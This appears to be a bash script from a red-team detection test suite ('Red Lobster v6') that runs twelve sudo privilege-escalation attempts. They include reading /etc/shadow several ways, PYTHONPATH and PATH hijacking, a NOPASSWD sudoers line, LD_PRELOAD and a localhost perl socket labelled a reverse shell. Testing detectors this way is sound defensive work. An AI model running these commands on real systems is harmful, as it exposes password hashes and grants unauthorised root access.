#!/usr/bin/env bash
# Red Lobster v6 — Flag 8: PRIV CHAIN — Sudo + runtime escalation
# v5 gaps: sudo python3 setuid (info only), sudo node HTTP server (undetected)
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag8" "Flag 8: PRIV CHAIN — Sudo + runtime escalation (v6)"
OUTDIR="$FLAG_DIR"

# 1. sudo node read /etc/shadow
rl_run "sudo node read /etc/shadow" \
  "sudo node -e \"require('fs').writeFileSync('$OUTDIR/8_1.txt', require('fs').readFileSync('/etc/shadow'))\""

# 2. sudo python3 os.setuid(0) + read (was info-only in v5)
rl_run "sudo python3 setuid(0) + shadow read" \
  "sudo python3 -c \"import os; os.setuid(0); open('$OUTDIR/8_2.txt','w').write(open('/etc/shadow').read())\""

# 3. sudo pip install malicious
rl_run "sudo pip install (simulated)" \
  "sudo pip install this-does-not-exist-rl6 2>/dev/null"

# 4. sudo PYTHONPATH injection
mkdir -p /tmp/redlobster/pypath6
echo "import os; os.system('id > $OUTDIR/8_4.txt')" > /tmp/redlobster/pypath6/backdoor.py
rl_run "sudo PYTHONPATH injection" \
  "sudo PYTHONPATH=/tmp/redlobster/pypath6 python3 -c 'import backdoor'"
rm -rf /tmp/redlobster/pypath6

# 5. sudo env PATH hijack
mkdir -p /tmp/redlobster/binpath6
echo '#!/bin/bash' > /tmp/redlobster/binpath6/ls
echo "id > $OUTDIR/8_5.txt" >> /tmp/redlobster/binpath6/ls
chmod +x /tmp/redlobster/binpath6/ls
rl_run "sudo env PATH hijack" \
  "sudo env PATH=/tmp/redlobster/binpath6:\$PATH ls"
rm -rf /tmp/redlobster/binpath6

# 6. sudo tee to sudoers (simulated)
rl_run "sudo tee sudoers write" \
  "echo 'agent ALL=(ALL) NOPASSWD: ALL' | sudo tee $OUTDIR/8_6_sudoers > /dev/null"

# 7. sudo LD_PRELOAD injection
rl_run "sudo LD_PRELOAD injection" \
  "sudo LD_PRELOAD=/tmp/nonexistent.so /usr/bin/id 2>/dev/null"

# 8. sudo node HTTP server on privileged port (was undetected in v5)
rl_run "sudo node HTTP server on port 80" \
  "sudo timeout 2 node -e \"require('http').createServer((q,r)=>{r.end('root')}).listen(80)\" 2>/dev/null"

# 9. sudo perl reverse shell attempt
rl_run "sudo perl reverse shell attempt" \
  "sudo timeout 2 perl -e 'use IO::Socket::INET; \$s=IO::Socket::INET->new(PeerAddr=>\"127.0.0.1:19999\"); exit 0;' 2>/dev/null"

# 10. sudo python3 -m http.server as root
rl_run "sudo python3 http.server as root" \
  "sudo timeout 2 python3 -m http.server 19998 2>/dev/null"

# 11. sudo bash -c with nested commands
rl_run "sudo bash -c nested commands" \
  "sudo bash -c 'cat /etc/shadow > $OUTDIR/8_11.txt'"

# 12. sudo dd read /etc/shadow
rl_run "sudo dd read /etc/shadow" \
  "sudo dd if=/etc/shadow of=$OUTDIR/8_12.txt 2>/dev/null"

rl_summary
rl_cleanup
